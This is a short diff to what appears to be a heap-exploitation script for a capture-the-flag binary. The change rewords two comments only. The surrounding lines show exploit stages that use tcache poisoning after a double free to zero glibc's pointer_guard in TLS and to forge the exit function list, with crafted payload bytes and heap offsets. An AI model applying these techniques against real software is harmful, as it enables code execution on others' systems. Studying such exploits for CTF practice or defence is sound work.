@@ -85,7 +85,7 @@ for _ in range(5):
 for _ in range(10):
     add_evidence(2, 0x38, b'2')
 
-# Stage 4: tcache poisoning with double free to zero pointer_guard in tls
+# Stage 4: tcache poisoning after double free to zero pointer_guard in tls
 add_evidence(0, 0x38, b'0') # heap_base_addr+0x2310
 add_evidence(1, 0x38, b'1'*0x28+b'\x51') # heap_base_addr+0x2350
 add_evidence(2, 0x38, b'2') # heap_base_addr+0x2390
@@ -122,7 +122,7 @@ add_evidence(0, 0x28, fake_initial[0:0x28])
 for i in range(0x21):
     add_evidence(0, 0x38, fake_initial[0x30+i*0x40:0x30+0x38+i*0x40])
 
-# Stage 6: tcache poisoning with double free to fake exit function list
+# Stage 6: tcache poisoning after double free to fake exit function list
 add_evidence(0, 0x38, b'0') # heap_base_addr+0x2c70
 add_evidence(1, 0x38, b'0'*0x28+b'\x51') # heap_base_addr+0x2cb0
 add_evidence(2, 0x38, b'0') # heap_base_addr+0x2cf0
